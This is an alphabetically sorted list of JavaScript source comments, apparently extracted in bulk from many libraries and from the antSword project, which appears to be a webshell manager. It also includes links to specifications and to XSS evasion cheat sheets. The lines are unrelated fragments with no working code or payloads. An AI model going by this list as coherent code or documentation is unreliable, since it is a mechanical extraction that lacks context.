// http://msdn.microsoft.com/en-us/library/ie/dww52sbt(v=vs.94).aspx
// http://msdn.microsoft.com/en-us/library/ie/hh465388.aspx#attribute_section
// http://msdn.microsoft.com/en-us/library/ms536429%28VS.85%29.aspx
// http://opensource.apple.com/source/WebCore/WebCore-658.28/css/CSSMediaRule.cpp
// http://source.icu-project.org/repos/icu/data/trunk/charset/data/xml/gb-18030-2000.xml
// http://stackoverflow.com/a/1068308/13216
// http://stackoverflow.com/a/62888/10333 contains more accurate
// http://stackoverflow.com/q/5827612/
// http://stackoverflow.com/questions/201323/using-a-regular-expression-to-validate-an-email-address#answer-8829363
// http://stackoverflow.com/questions/298750/how-do-i-select-text-nodes-with-jquery
// http://tools.ietf.org/html/rfc2617#section-3
// http://tools.ietf.org/html/rfc3339#section-5.6
// http://tools.ietf.org/html/rfc5849#section-3.4.1.3.2
// http://web.archive.org/web/20100324014747/http://blindsignals.com/index.php/2009/07/jquery-delay/
// http://wiki.ecmascript.org/doku.php?id=harmony:destructuring
// http://wiki.ecmascript.org/doku.php?id=harmony:generators
// http://wiki.ecmascript.org/doku.php?id=harmony:iterators
// http://wiki.ecmascript.org/doku.php?id=harmony:modules
// http://wiki.ecmascript.org/doku.php?id=harmony:object_literals#object_literal_property_value_shorthand
// http://wiki.ecmascript.org/doku.php?id=harmony:rest_parameters
// http://wiki.ecmascript.org/doku.php?id=proposals:iterators_and_generators&s=each
// http://wiki.ecmascript.org/doku.php?id=strawman:maximally_minimal_classes
// http://www.khngai.com/chinese/charmap/tblgbk.php?page=0
// http://www.leancrew.com/all-this/2010/11/smart-quotes-in-javascript/
// http://www.movable-type.co.uk/scripts/sha1.html
// http://www.opensource.apple.com/source/WebCore/WebCore-955.66.1/css/WebKitCSSFontFaceRule.cpp
// http://www.opensource.apple.com/source/WebCore/WebCore-955.66.1/css/WebKitCSSKeyframeRule.cpp
// http://www.opensource.apple.com/source/WebCore/WebCore-955.66.1/css/WebKitCSSKeyframesRule.cpp
// http://www.thespanner.co.uk/2007/11/26/ultimate-xss-css-injection/
// http://www.w3.org/TR/2003/WD-DOM-Level-3-Events-20030331/ecma-script-binding.html
// http://www.w3.org/TR/2011/REC-css3-selectors-20110929/#checked
// http://www.w3.org/TR/CSS21/syndata.html#value-def-identifier
// http://www.w3.org/TR/DOM-Level-2-Style (2000)
// http://www.w3.org/TR/DOM-Level-3-Core/glossary.html#dt-document-order
// http://www.w3.org/TR/REC-xml-names/#NT-NCName
// http://www.w3.org/TR/REC-xml-names/#NT-QName
// http://www.w3.org/TR/REC-xml/#NT-Name
// http://www.w3.org/TR/REC-xml/#NT-NameStartChar
// http://www.w3.org/TR/css3-selectors/#enableddisabled
// http://www.w3.org/TR/css3-selectors/#selector-syntax
// http://www.w3.org/TR/css3-selectors/#whitespace
// http://www.w3.org/TR/css3-syntax/#characters
// http://www.w3.org/TR/cssom-view/ (2008)
// http://www.w3.org/TR/html5/forms.html#valid-e-mail-address (search for 'willful violation')
// http://www.w3.org/TR/html5/links.html#selector-enabled
// http://www.w3.org/TR/selectors/#empty-pseudo
// http://www.w3.org/TR/selectors/#lang-pseudo
// http://www.w3.org/TR/selectors/#pseudo-classes
// http://www.w3.org/TR/xml-names/#NT-NCName
// http://www.w3.org/TR/xml-names/#NT-QName
// http://www.w3.org/TR/xml/#NT-Name
// http://www.whatwg.org/specs/web-apps/current-work/#category-listed
// http://www.whatwg.org/specs/web-apps/current-work/#selectors
// https://bugs.webkit.org/show_bug.cgi?id=136851
// https://bugs.webkit.org/show_bug.cgi?id=137337
// https://bugs.webkit.org/show_bug.cgi?id=19047
// https://bugzilla.mozilla.org/show_bug.cgi?id=208427
// https://bugzilla.mozilla.org/show_bug.cgi?id=885597.
// https://chromium.googlesource.com/chromium/blink/+/96aa3a280ab7d67178c8f122a04949ce5f8579e0/Source/core/css/html.css
// https://code.google.com/p/chromium/codesearch#chromium/src/third_party/WebKit/Source/bindings/core/v8/V8LazyEventListener.cpp
// https://code.google.com/p/chromium/issues/detail?id=378607
// https://code.google.com/p/chromium/issues/detail?id=470258
// https://connect.microsoft.com/IE/feedback/details/837245/xmlhttprequest-upload-throws-invalid-argument-when-used-from-web-worker-context
// https://dev.twitter.com/docs/auth/creating-signature
// https://developer.mozilla.org/En/Core_JavaScript_1.5_Reference/Objects/Array/IndexOf
// https://developer.mozilla.org/en-US/docs/Tools/Web_Console#Styling_messages
// https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe#attr-sandbox
// https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Date/now#Compatibility
// https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/endsWith
// https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/includes
// https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/startsWith
// https://developer.mozilla.org/en/Mozilla_Quirks_Mode_Behavior
// https://developers.google.com/speed/public-dns/
// https://docs.microsoft.com/en-us/dotnet/api/system.io.fileattributes?view=netcore-1.0
// https://docs.microsoft.com/zh-cn/previous-versions/powershell/module/microsoft.powershell.management/set-itemproperty?view=powershell-3.0
// https://dom.spec.whatwg.org/#concept-attribute-qualified-name
// https://dom.spec.whatwg.org/#concept-element-attributes-append
// https://dom.spec.whatwg.org/#concept-element-attributes-change
// https://dom.spec.whatwg.org/#concept-element-attributes-get-by-name
// https://dom.spec.whatwg.org/#concept-element-attributes-get-by-namespace
// https://dom.spec.whatwg.org/#concept-element-attributes-remove
// https://dom.spec.whatwg.org/#concept-element-attributes-remove-by-name
// https://dom.spec.whatwg.org/#concept-element-attributes-remove-by-namespace
// https://dom.spec.whatwg.org/#concept-element-attributes-set
// https://dom.spec.whatwg.org/#concept-element-attributes-set-value
// https://dom.spec.whatwg.org/#concept-element-interface
// https://dom.spec.whatwg.org/#concept-getElementsByClassName
// https://dom.spec.whatwg.org/#dom-node-baseuri
// https://dom.spec.whatwg.org/#dom-node-isequalnode
// https://dom.spec.whatwg.org/#domtokenlist
// https://dom.spec.whatwg.org/#interface-nodefilter
// https://dom.spec.whatwg.org/#interface-nodeiterator
// https://dom.spec.whatwg.org/#interface-parentnode
// https://dom.spec.whatwg.org/#namednodemap
// https://dom.spec.whatwg.org/#nondocumenttypechildnode
// https://dom.spec.whatwg.org/#validate
// https://en.wikipedia.org/wiki/Topological_sorting#Kahn.27s_algorithm
// https://github.com/AntSwordProject/antSword/issues/135#issuecomment-475842870
// https://github.com/ChromiumWebApps/chromium/blob/b3d3b4da8bb94c1b2e061600df106d590fda3620/net/cookies/parsed_cookie.cc#L60
// https://github.com/ajv-validator/ajv/issues/889
// https://github.com/ariya/phantomjs/issues/11013
// https://github.com/aws/aws-sdk-java-v2/blob/dc695de6ab49ad03934e1b02e7263abbd2354be0/core/auth/src/main/java/software/amazon/awssdk/auth/signer/internal/AbstractAws4Signer.java#L59
// https://github.com/aws/aws-sdk-js/blob/18cb7e5b463b46239f9fdd4a65e2ff8c81831e8f/lib/signers/v4.js#L191-L199
// https://github.com/bagder/curl/blob/6beb0eee/lib/http.c#L710
// https://github.com/bagder/curl/blob/master/lib/http_digest.c
// https://github.com/bestiejs/punycode.js - punycode.ucs2.decode
// https://github.com/estree/estree/blob/a27003adf4fd7bfad44de9cef372a2eacd527b1c/es5.md#regexpliteral
// https://github.com/facebook/react/issues/1698
// https://github.com/felixge/node-form-data/issues/38
// https://github.com/form-data/form-data/issues/196
// https://github.com/form-data/form-data/issues/262
// https://github.com/form-data/form-data/issues/40
// https://github.com/isaacs/node-graceful-fs/issues/4
// https://github.com/isaacs/readable-stream/issues/16
// https://github.com/joyent/node/blob/f8c335d0caf47f16d31413f89aa28eda3878e3aa/lib/util.js
// https://github.com/joyent/node/issues/7819
// https://github.com/jquery/jquery/blob/2.1.3/src/manipulation/var/rcheckableType.js
// https://github.com/jquery/jquery/blob/2.1.3/src/serialize.js
// https://github.com/jquery/jquery/pull/764
// https://github.com/jrburke/requirejs/wiki/Updating-existing-libraries#wiki-anon
// https://github.com/maxogden/extract-zip/issues/13#issuecomment-154494566
// https://github.com/mhart/aws4fetch/blob/b3aed16b6f17384cf36ea33bcba3c1e9f3bdfefd/src/main.js#L25-L34
// https://github.com/mishoo/UglifyJS2/blob/v2.4.20/lib/parse.js#L216
// https://github.com/mozilla/localForage#working-on-localforage
// https://github.com/mozilla/localForage/issues/247
// https://github.com/mozilla/localForage/issues/250
// https://github.com/mozilla/localForage/pull/42
// https://github.com/mozilla/sweet.js/wiki/design
// https://github.com/nodejs/node/blob/v10.8.0/lib/internal/errors.js
// https://github.com/nolanlawson/state-of-binary-data-in-the-browser#readme
// https://github.com/petkaantonov/bluebird/blob/3e36fc861ac5795193ba37935333eb6ef3716390/src/util.js#L177
// https://github.com/pouchdb/pouchdb/blob/9c25a23/src/adapters/idb/blobSupport.js
// https://github.com/tc39/proposal-nullish-coalescing
// https://github.com/tc39/proposal-optional-catch-binding
// https://github.com/tc39/proposal-optional-chaining
// https://github.com/tmpvar/jsdom/pull/1190
// https://github.com/tmpvar/jsdom/pull/1247#issuecomment-149060470
// https://heycam.github.io/webidl/#idl-DOMException-error-names
// https://heycam.github.io/webidl/#idl-named-properties
// https://html.spec.whatwg.org/#events-and-the-window-object
// https://html.spec.whatwg.org/#process-the-iframe-attributes
// https://html.spec.whatwg.org/multipage/dom.html#dom-document-cookie
// https://html.spec.whatwg.org/multipage/infrastructure.html#document-base-url
// https://html.spec.whatwg.org/multipage/infrastructure.html#fallback-base-url
// https://html.spec.whatwg.org/multipage/interaction.html#dom-click
// https://html.spec.whatwg.org/multipage/interaction.html#run-synthetic-click-activation-steps
// https://html.spec.whatwg.org/multipage/microdata.html#microdata-dom-api
// https://html.spec.whatwg.org/multipage/rendering.html#the-css-user-agent-style-sheet-and-presentational-hints
// https://html.spec.whatwg.org/multipage/semantics.html#frozen-base-url
// https://html.spec.whatwg.org/multipage/semantics.html#htmllinkelement:
// https://html.spec.whatwg.org/multipage/semantics.html#htmlstyleelement:
// https://html.spec.whatwg.org/multipage/semantics.html#the-html-element
// https://html.spec.whatwg.org/multipage/syntax.html#generate-implied-end-tags
// https://html.spec.whatwg.org/multipage/syntax.html#has-an-element-in-button-scope
// https://html.spec.whatwg.org/multipage/syntax.html#has-an-element-in-scope
// https://html.spec.whatwg.org/multipage/syntax.html#html-integration-point
// https://html.spec.whatwg.org/multipage/syntax.html#parsing-main-inbody
// https://html.spec.whatwg.org/multipage/syntax.html#parsing-main-incaption
// https://html.spec.whatwg.org/multipage/syntax.html#parsing-main-incolgroup
// https://html.spec.whatwg.org/multipage/syntax.html#parsing-main-inhead
// https://html.spec.whatwg.org/multipage/syntax.html#parsing-main-inselect
// https://html.spec.whatwg.org/multipage/syntax.html#parsing-main-intable
// https://html.spec.whatwg.org/multipage/syntax.html#parsing-main-intbody
// https://html.spec.whatwg.org/multipage/syntax.html#parsing-main-intd
// https://html.spec.whatwg.org/multipage/syntax.html#parsing-main-intr
// https://html.spec.whatwg.org/multipage/syntax.html#special
// https://html.spec.whatwg.org/multipage/webappapis.html#event-handler-content-attributes
// https://html.spec.whatwg.org/multipage/webappapis.html#getting-the-current-value-of-the-event-handler
// https://html.spec.whatwg.org/multipage/webappapis.html#report-the-error
// https://html.spec.whatwg.org/multipage/webappapis.html#the-event-handler-processing-algorithm
// https://mathiasbynens.be/notes/javascript-encoding
// https://msdn.microsoft.com/en-us/library/hh869301%28v=vs.85%29.aspx
// https://stackoverflow.com/questions/17913609/javascript-unicode-base64-encode
// https://tc39.github.io/ecma262/#sec-additive-operators
// https://tc39.github.io/ecma262/#sec-array-initializer
// https://tc39.github.io/ecma262/#sec-arrow-function-definitions
// https://tc39.github.io/ecma262/#sec-assignment-operators
// https://tc39.github.io/ecma262/#sec-binary-bitwise-operators
// https://tc39.github.io/ecma262/#sec-binary-logical-operators
// https://tc39.github.io/ecma262/#sec-bitwise-shift-operators
// https://tc39.github.io/ecma262/#sec-block
// https://tc39.github.io/ecma262/#sec-break-statement
// https://tc39.github.io/ecma262/#sec-class-definitions
// https://tc39.github.io/ecma262/#sec-comma-operator
// https://tc39.github.io/ecma262/#sec-comments
// https://tc39.github.io/ecma262/#sec-conditional-operator
// https://tc39.github.io/ecma262/#sec-continue-statement
// https://tc39.github.io/ecma262/#sec-debugger-statement
// https://tc39.github.io/ecma262/#sec-destructuring-binding-patterns
// https://tc39.github.io/ecma262/#sec-directive-prologues-and-the-use-strict-directive
// https://tc39.github.io/ecma262/#sec-do-while-statement
// https://tc39.github.io/ecma262/#sec-ecmascript-language-statements-and-declarations
// https://tc39.github.io/ecma262/#sec-empty-statement
// https://tc39.github.io/ecma262/#sec-equality-operators
// https://tc39.github.io/ecma262/#sec-exp-operator
// https://tc39.github.io/ecma262/#sec-exports
// https://tc39.github.io/ecma262/#sec-expression-statement
// https://tc39.github.io/ecma262/#sec-for-in-and-for-of-statements
// https://tc39.github.io/ecma262/#sec-for-statement
// https://tc39.github.io/ecma262/#sec-function-definitions
// https://tc39.github.io/ecma262/#sec-future-reserved-words
// https://tc39.github.io/ecma262/#sec-generator-function-definitions
// https://tc39.github.io/ecma262/#sec-grouping-operator
// https://tc39.github.io/ecma262/#sec-if-statement
// https://tc39.github.io/ecma262/#sec-imports
// https://tc39.github.io/ecma262/#sec-keywords
// https://tc39.github.io/ecma262/#sec-labelled-statements
// https://tc39.github.io/ecma262/#sec-left-hand-side-expressions
// https://tc39.github.io/ecma262/#sec-let-and-const-declarations
// https://tc39.github.io/ecma262/#sec-line-terminators
// https://tc39.github.io/ecma262/#sec-literals-numeric-literals
// https://tc39.github.io/ecma262/#sec-literals-regular-expression-literals
// https://tc39.github.io/ecma262/#sec-literals-string-literals
// https://tc39.github.io/ecma262/#sec-method-definitions
// https://tc39.github.io/ecma262/#sec-modules
// https://tc39.github.io/ecma262/#sec-multiplicative-operators
// https://tc39.github.io/ecma262/#sec-names-and-keywords
// https://tc39.github.io/ecma262/#sec-object-initializer
// https://tc39.github.io/ecma262/#sec-primary-expression
// https://tc39.github.io/ecma262/#sec-punctuators
// https://tc39.github.io/ecma262/#sec-relational-operators
// https://tc39.github.io/ecma262/#sec-return-statement
// https://tc39.github.io/ecma262/#sec-scripts
// https://tc39.github.io/ecma262/#sec-switch-statement
// https://tc39.github.io/ecma262/#sec-template-literal-lexical-components
// https://tc39.github.io/ecma262/#sec-template-literals
// https://tc39.github.io/ecma262/#sec-throw-statement
// https://tc39.github.io/ecma262/#sec-try-statement
// https://tc39.github.io/ecma262/#sec-unary-operators
// https://tc39.github.io/ecma262/#sec-update-expressions
// https://tc39.github.io/ecma262/#sec-variable-statement
// https://tc39.github.io/ecma262/#sec-while-statement
// https://tc39.github.io/ecma262/#sec-white-space
// https://tc39.github.io/ecma262/#sec-with-statement
// https://tools.ietf.org/html/rfc3339#appendix-C
// https://tools.ietf.org/html/rfc3986#section-3
// https://url.spec.whatwg.org/#dom-urlutils-href
// https://www.ecma-international.org/ecma-262/8.0/#prod-Alternative
// https://www.ecma-international.org/ecma-262/8.0/#prod-Atom
// https://www.ecma-international.org/ecma-262/8.0/#prod-CharacterClass
// https://www.ecma-international.org/ecma-262/8.0/#prod-CharacterClassEscape
// https://www.ecma-international.org/ecma-262/8.0/#prod-ClassAtom
// https://www.ecma-international.org/ecma-262/8.0/#prod-ClassAtomNoDash
// https://www.ecma-international.org/ecma-262/8.0/#prod-ClassRanges
// https://www.ecma-international.org/ecma-262/8.0/#prod-ControlEscape
// https://www.ecma-international.org/ecma-262/8.0/#prod-ControlLetter
// https://www.ecma-international.org/ecma-262/8.0/#prod-DecimalDigits
// https://www.ecma-international.org/ecma-262/8.0/#prod-DecimalEscape
// https://www.ecma-international.org/ecma-262/8.0/#prod-Disjunction
// https://www.ecma-international.org/ecma-262/8.0/#prod-Hex4Digits
// https://www.ecma-international.org/ecma-262/8.0/#prod-HexDigit
// https://www.ecma-international.org/ecma-262/8.0/#prod-HexDigits
// https://www.ecma-international.org/ecma-262/8.0/#prod-HexEscapeSequence
// https://www.ecma-international.org/ecma-262/8.0/#prod-NonemptyClassRanges
// https://www.ecma-international.org/ecma-262/8.0/#prod-NonemptyClassRangesNoDash
// https://www.ecma-international.org/ecma-262/8.0/#prod-OctalDigit
// https://www.ecma-international.org/ecma-262/8.0/#prod-Pattern
// https://www.ecma-international.org/ecma-262/8.0/#prod-PatternCharacter
// https://www.ecma-international.org/ecma-262/8.0/#prod-Quantifier
// https://www.ecma-international.org/ecma-262/8.0/#prod-QuantifierPrefix
// https://www.ecma-international.org/ecma-262/8.0/#prod-RegExpUnicodeEscapeSequence
// https://www.ecma-international.org/ecma-262/8.0/#prod-SyntaxCharacter
// https://www.ecma-international.org/ecma-262/8.0/#prod-annexB-Assertion
// https://www.ecma-international.org/ecma-262/8.0/#prod-annexB-AtomEscape
// https://www.ecma-international.org/ecma-262/8.0/#prod-annexB-CharacterEscape
// https://www.ecma-international.org/ecma-262/8.0/#prod-annexB-ClassControlLetter
// https://www.ecma-international.org/ecma-262/8.0/#prod-annexB-ClassEscape
// https://www.ecma-international.org/ecma-262/8.0/#prod-annexB-ExtendedAtom
// https://www.ecma-international.org/ecma-262/8.0/#prod-annexB-ExtendedPatternCharacter
// https://www.ecma-international.org/ecma-262/8.0/#prod-annexB-IdentityEscape
// https://www.ecma-international.org/ecma-262/8.0/#prod-annexB-InvalidBracedQuantifier
// https://www.ecma-international.org/ecma-262/8.0/#prod-annexB-LegacyOctalEscapeSequence
// https://www.ecma-international.org/ecma-262/8.0/#prod-annexB-Term
// https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
// i got your open file right here.
// i++;
// id/class/tag/pseudo-class identifier
// identifiers.
// idx of the start of current parsed sequence.
// ie css expression mode
// ie9 doesn't have 'response' property
// if
// if (!(symObj instanceof Symbol)) { return false; }
// if (String(sym) !== Symbol.prototype.toString.call(sym)) { return false; }
// if (c !== 'custom') {
// if (cache = this.cache[path]) {
// if (i % 2 == 1) {
// if (i<80) {
// if (id.startsWith('conn::')) {
// if (n < 32) {
// if (process.env.TRAVIS_JOB_ID ||
// if (sym instanceof Symbol) { return false; }
// if (this.__opts__['otherConf'].hasOwnProperty('use-custom-datatag') && this.__opts__['otherConf']['use-custom-datatag'] == 1 && this.__opts__['otherConf']['custom-datatag-tage']) {
// if (this.__opts__['otherConf'].hasOwnProperty('use-custom-datatag') && this.__opts__['otherConf']['use-custom-datatag'] == 1 && this.__opts__['otherConf']['custom-datatag-tags']) {
// if (typeof Promise === 'undefined') {
// if (typeof Symbol.prototype.toString !== 'function') { return false; }
// if _final has been called
// if a let/const declaration in the function clashes with one of the params.
// if an extension fails to parse the selector
// if anchor exists use parent tab
// if any extraction fails then abort everything
// if it literally is just '>' or '' then allow anything.
// if it's not a basic code point
// if last attempt use specified last resort position
// if need cookie and cookie is not empty
// if needed.
// if next templateElement isn't empty...
// if no Flash Player is installed or the fp version cannot be detected we let the HTML object element do its job (either show a SWF or alternative content)
// if no callback
// if no content
// if no content type. allow it to be empty array
// if no mode then default to default modes
// if no port provided use default one
// if not inside an iframe
// if not modified
// if not overlay queue animation after hide
// if our last write ended with an incomplete multibyte character
// if payload length is greater than this number.
// if possible.
// if result is Promise object
// if result is true then at least one of the files exists
// if result is true then every file exists
// if that fails switch to `parse_dammit`. The loose parser might
// if the build contains more than one branch of the same module
// if the environment has a Symbol sham that mostly follows the spec.
// if the error wasn't actually fatal.  otherwise the parse
// if the key is ACTUALLY `null` or undefined but returning `null`.
// if the multiple attr is not present on the select
// if the noProxy is a wildcard then return null
// if the noProxy is not empty and the uri is found return null
// if the readable side is ready for autoDestroy as well
// if the reader is waiting for a drain event from this
// if the writable side is ready for autoDestroy as well
// if there is no previous sibling return the parent (might be null)
// if they are listened for after emitting.
// if this is a duplex stream mark the writable part as destroyed as well
// if using $.tab don't add events
// if we bail after first err
// if we don't have a startTime we have no way of knowing if we've waited
// if we encounter an escaped % then don't increase the array index
// if we have an `http.Agent` instance then call the .agent() function
// if we have detected an error in the meanwhile
// if we have multiple next() calls
// if we see `var foo = require('bar')` we can just inline the variable
// if we're just parsing
// if we've received a response then we don't want to let
// if you swap the keys of but not the refs. Reconsider where this check
// if your tree doesn't enforce a unique constraint
// if(!nValue.match(/^[a-zA-Z0-9_/]+$/)){
// iframe should never load in a document without a Window
// ignore
// ignore IDs
// ignore any invalid values to preserve backwards-compatibility
// ignore any potential response body.  it cannot possibly be useful
// ignore empty strings
// ignore the comment
// ignore unknown cache value
// ignore unnecessary end() calls.
// ignore useless type name
// ignoreWarnings[].message = /Can't resolve 'coffee-script'/
// ignored entries get .resume() called on them straight away"
// ignores it.
// image only animation settings
// imageBuffer is all of `cat.png` as a node.js Buffer
// immediately reconciled instead of waiting for the next batch.
// immediately.
// implementation at all of isTrusted.
// implementation from standard node.js 'util' module
// implementation of 302 following defacto standard
// implementations of a working draft specification.
// implemented in any major browser. Only KeyPress has charCode.
// implicitly created
// import '...'
// import 'foo';
// import * as foo
// import <* as foo> ...;
// import <* as id> from ...;
// import <foo> ...;
// import <id> from ...;
// import About from './about'; import Update from './update'; import Language
// import Base from '../base';
// import ImportClause FromClause ;
// import ModuleSpecifier ;
// import foo
// import {
// import {<foo as bar>} ...;
// import {<id [as name]>} from ...;
// import {bar}
// important for assert.deepEqual checks
// important for i.e. `PacProxyAgent` which determines a failed proxy
// important when wrapping filters and duplexes.
// impossible to determine whether two paths refer to the same thing on
// in AssignmentExpression nodes.
// in IE throws an error.
// in Narwhal or RingoJS v0.7.0-
// in Rhino or a web browser
// in Safari 9 which returns 'object' for typed arrays and other constructors.
// in a module
// in a script isn't considered an error.
// in a stylesheet to whatever the default browser style is
// in all copies or substantial portions of the Software.
// in an entry ending before we're ready for it.
// in both SourceMaps
// in case it gets translated into something else (0 -> 0px)
// in case it turns out to be a false lead
// in case of POST etc
// in case you want to operate on that value only after you're sure it
// in future `getUri()` calls with the same data URI passed in.
// in old versions of Safari).
// in play at the same time.
// in strict mode
// in the Esprima AST format.
// in the browser if you want to load ajv-async bundle separately you can:
// in the canvas spec (yet) anyway.
// in the next statement
// in the node repl
// in which case it probably won't have a .loc property (or an
// in which we actually take advantage of JS scoping
// in your main HTML document.
// in-front of the non-visible tags. Piggyback on the whitespace fix
// inactive to active change
// include child entries if a dir is included
// include it twice in the fixture
// include stack if exists and not turned off
// include version
// included directly via <script> tag
// included in the first set for all its dir queues
// inclusive
// incoming file to finish to get its size.
// incompatible node.js
// incomplete char.
// inconsistencies with ReactMount's node cache. See #1105.
// incremented each time a cookie is created
// indent
// indent stack trace without msg
// index of the root value and the index of the final value is always
// index within nodes that each series begins.
// index.js
// indexes documents with _id always set
// indexes within the common ancestor
// indicate that the traversal need not continue any further down
// inf and nan don't become null
// infix word operators all start with `i`
// info.remoteHost is the remote address of the client that connected to the SOCKS proxy.
// information of the last axis.
// information on preventing compatibility mode
// init REs and context
// init context specific variables
// init() contains all the code to setup the request object.
// initial response line
// initialise previous row
// initialize
// initialize caching for each document
// initialized with the loading context
// initialized.
// initializer or constructor respectively.
// initiate request
// initiate the WebSocket connection
// inject alias
// inner circle
// innerText usage removed for consistency of new lines (jQuery #11153)
// input keydown event will fire submit repeatedly by browser default
// insert a as the first child
// insert a before b
// insert c after b
// insert c as the last child
// insert markup into a <div> or <iframe> depending on the container
// insert placeholder div that will be replaced by the alternative content
// insert placeholder div that will be replaced by the object element that loads expressinstall.swf
// inserted or moved before `child`.
// insertion
// inside it or inside any sub-expression.
// inst is an internal instance (but could be a composite)
// instance methods
// instances are created using builder functions.
// instantiateReactComponent is done.
// instead of `(!x)[1]` is handled by the fact that the parser
// instead of for..in we can zip the iterators and check if an item has
// instead of the first because it can end up
// instead of the server's actual host.
// instructs the `setItem()` callback/promise to be executed). This is how
// int hashCode()
// integer wrap around
// intentionally not ===
// intentionally wrong
// intercept that by temporarily making it a no-op.
// intercept the AbortRequest exception.  Other kinds of
// interface types for AST nodes.
// internal aliases
// internal only
// into it.
// into.
// introduced for definitional convenience.
// invalid types are ignored.
// invasive changes and simplifications without creating a complicated
// invert: Remove suffix of non-c chars instead. Default falsey.
// invocations that match the given `names` array.
// invoke method in context of current instance
// invoke the listener
// invoked by mutation events to expire cached parts
// invoked if expressions match selectors
// ios only (scroll on html not document). This prevent auto-resize canvas/scroll in ios
// ios scroll on html not document
// ip-api.com sees that the last proxy (104.131.124.203) is connected to it and not the origin client (you).
// ip-api.com sees that the last proxy in the chain (104.131.124.203) is connected to it.
// ipv4 long conversion
// ipv4 or ipv6 or hostname
// is 2nd argument a testEnvironment?
// is === from. This is primarily useful for literal values like
// is Logical.
// is a QuantifiableAssertion.
// is a regular `for` loop.
// is allowed and treated as a line comment.
// is any of its children.
// is appropriate for patching into the location of oldNode.
// is at least string length
// is attached before any userland ones.  NEVER DO THIS.
// is based on the assumption that a the average number of files per
// is based solely on the element's language value
// is borked.
// is called with a cb that clears the reservation.
// is changed from JS so we redefine a setter for `.value` that updates
// is exactly length
// is fairly slow to generate.
// is false (domain name mismatch).
// is false (hostname mismatch).
// is false.
// is firebug? http://stackoverflow.com/a/398120/376773
// is firefox >= v31?
// is fixed.
// is important when using controlled components within layers:
// is interpreted as a replacement value.
// is it #aaa or #ababab
// is left as an exercise for the reader.
// is less than it then it isn't higher than the range
// is less than length
// is likely undefined and we'll pass it straight to the
// is made. It probably belongs where the key checking and
// is meant to address the deprecation warning:
// is most likely an email
// is not an indication for either Logical or Visual text.
// is not empty or blank string
// is probably a mistake to retain a reference to the path.
// is the most common case so we do not pay any perf
// is this one of our fancy encoded blobs?
// is true (exact match).
// is true iff the IP address of host matches exactly 198.95.249.79.
// is true iff the IP address of the host matches 198.95.*.*.
// is true.
// is updated when `request` follows redirects.
// is used to get the proxyUri.
// is valid integer or matches range
// is valid number
// is valid number (with decimal)
// is value
// is value (case insensitive)
// is webkit? http://stackoverflow.com/a/16459606/376773
// is zero then disallow separators.
// isHidden might be called from jQuery#filter function;
// isn't a whole lot we can do. See pull request at this URL for discussion:
// isn't displayed and doesn't have to be the current year.
// isn't outside it
// isnt json string
// issue #675: return the raw response if the response parsing fails
// issue #876: return the http status code if the response parsing fails
// issues 4
// istanbul ignore else
// istanbul ignore if
// istanbul ignore next
// it asks for the name of the charset identified. If the prober queried is a
// it at the keypress level and bail immediately. Android Chrome
// it becomes responsible for boundary
// it can be either of two situations
// it can be rejected by the transport if it is invalid
// it could be the beginning of a new sequence
// it doesn't respect `end` options without `start` options
// it is a NodeMultiSet
// it is async
// it is most likely a programmer error. In this case we throw a very
// it means that we need to wait until it does.
// it needs to be printed with this non-exported declaration node.
// it no longer has a value defined.
// it will be automatically made async
// it will be initialized again.
// it will result in this function being called again.
// it with the arguments supplied.
// it would still be ignored because these fields are reset.
// it wrongly includes 'selected' options elements
// it's a non-match (-1) or prefix (0)
// it's a public suffix
// it's forbidden by shouldUpdateReactComponent. The ref can change
// it's in progress.
// it's not a suffix
// it's not my fault localStorage is our baseline and that
// it's possible for an element created outside a composite to be
// it's tasty
// it's weird.
// it's worth trying to re-run the transaction.
// it.
// it. If the readable side of the socket is in flowing mode then there is no
// itemID and itemRef are for Microdata support as well but
// iterate over the tokens
// iterate through each category result
// iterate through search fields looking for matches
// iterate through the noProxyList until it finds a match.
// its local scope
// itself.
// jQuery handler
// jQuery.Event is based on DOM3 Events as specified by the ECMAScript Language Binding
// jQuery.event.stopPropagation function we had a check for existence of
// jQuery.support is not used in Core but other projects attach their
// javascript strings are UTF-16 encoded
// join the rest of the body into a single base64-blob
// join used to fix memory issue caused by concatenation: https://bugs.chromium.org/p/v8/issues/detail?id=3175#c4
// jq selector or element that should be used as popup
// js classes are fun
// jscs:disable requireUseStrict
// jsonfile exports
// just a JSON-equivalent object.
// just as Sizzle does
// just call tar.r with the filter and mtimeCache
// just like a 150
// just makes sure related localForages aren't pending.
// just one destination.  most common case.
// just pre-load all the stuff that index.js lazily exports
// just put it in the set and return
// just remember that we saw it.
// just remove all childNodes. We could hide all elements and remove
// just return the raw lines for now
// just skip b without pushing it.
// just take a part of the first list item.
// just to add the BANNER
// just zero
// justification:
// k here could be any string
// keep buffering
// keep the shape of Identifier nodes consistent with everything
// keep track of the timeout between retry() calls
// keep-alive connection) do not bother. This is important since we won't
// keeping localStorage support intact.
// key is likely undefined and we'll pass it straight
// key/values into a query string
// keyboard hints.
// keys will be converted to camelCase.
// keystroke if user does a key repeat (it'll be a little delayed: right
// kind may be `const` or `let`
// label selection should occur even when element has no focus
// label settings on multi-select
// lang value must be a valid identifier
// language chain
// language::en"
// language::zh"
// larger one:
// larger than z's character code then subtract 26 to support wrap around.
// last 512
// last argument - result callback
// last clause above produced by https://mothereff.in/regexpu#%2F%5B%5Cu%7B10000%7D-%5Cu%7BEFFFF%7D%5D%2Fu
// last item in the list is the current one
// last step - calculate inverse mod DV directly;
// last time cache initialization was called
// last two and interpret the remaining 16 as two 8-bit big-endian numbers.
// lastAccessed may not be important to some stores and an equality
// lastTime
// later.
// latest version the library supports). This influences support
// layout
// layout.hideHeader();
// leading byte order mark or whitespace
// leading or trailing whitespace is ignored per the gfm spec
// leading whitespace
// leaks a reference to the public instance.
// least one of which is guaranteed to be defined.
// leave as prototype default
// leave it in a clean state
// leave strings and buffers as-is
// left = reference / context object
// legacy
// legacy names
// legacy streams
// legacy.
// legacy...
// legend
// length of all fragments.
// length of items in the list
// less the number of blocks that must remain in the buffer
// let arr = []; _arr.map((_) => {   arr.push(antSword.noxss(_)); });
// let formatter = new this.format(this.__opts__['encode']);
// let formidable handle all non-file parts
// let the original error be the failure reason.
// let these lazy accessors compute their values on-the-fly.
